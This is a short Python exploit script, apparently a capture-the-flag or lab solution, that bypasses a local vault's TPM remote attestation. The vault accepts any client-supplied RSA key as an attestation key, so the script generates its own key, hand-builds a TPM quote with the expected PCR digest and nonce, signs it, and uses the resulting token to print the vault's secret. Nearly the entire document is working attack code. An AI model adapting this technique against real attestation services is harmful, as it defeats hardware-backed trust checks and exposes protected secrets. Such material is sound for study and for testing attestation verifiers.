#!/usr/bin/env python3
"""Forge a TPM quote for KEYSTONE's unbound-attestation vault."""
import base64
import hashlib
import json
import struct
import time
import urllib.parse
import urllib.request

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa

VAULT = "http://127.0.0.1:9000"


def request(path, data=None):
    body = json.dumps(data).encode() if data is not None else None
    req = urllib.request.Request(
        VAULT + path,
        data=body,
        headers={"content-type": "application/json"} if body else {},
    )
    with urllib.request.urlopen(req, timeout=5) as response:
        return json.load(response)


# The bug: the vault accepts any RSA key supplied by the client as an AK.
key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_pem = key.public_key().public_bytes(
    serialization.Encoding.PEM,
    serialization.PublicFormat.SubjectPublicKeyInfo,
).decode()

attest = request("/attest", {"ak_pub_pem": public_pem})
nonce = bytes.fromhex(attest["nonce"])
pcrs = attest["expected_pcrs"]
pcr_digest = hashlib.sha256(
    b"".join(bytes.fromhex(pcrs[n]) for n in ("0", "1", "7"))
).digest()

# Build the small subset of TPMS_ATTEST which main.go actually parses.
bitmap = bytes([0x83, 0x00, 0x00])  # select PCR 0, 1 and 7
pcr_selection = struct.pack(">IHB", 1, 0x000B, len(bitmap)) + bitmap
quote = (
    struct.pack(">IH", 0xFF544347, 0x8018)  # magic and ATTEST_QUOTE type
    + struct.pack(">H", 0)                 # empty qualifiedSigner
    + struct.pack(">H", len(nonce)) + nonce
    + struct.pack(">QIIB", int(time.time() * 1000), 0, 0, 1)
    + struct.pack(">Q", 0)
    + pcr_selection
    + struct.pack(">H", len(pcr_digest)) + pcr_digest
)
signature = key.sign(quote, padding.PKCS1v15(), hashes.SHA256())

verified = request("/verify", {
    "session": attest["session"],
    "quote_msg": base64.b64encode(quote).decode(),
    "quote_sig": base64.b64encode(signature).decode(),
})
secret = request("/secret?token=" + urllib.parse.quote(verified["token"]))
print(secret["payload"])
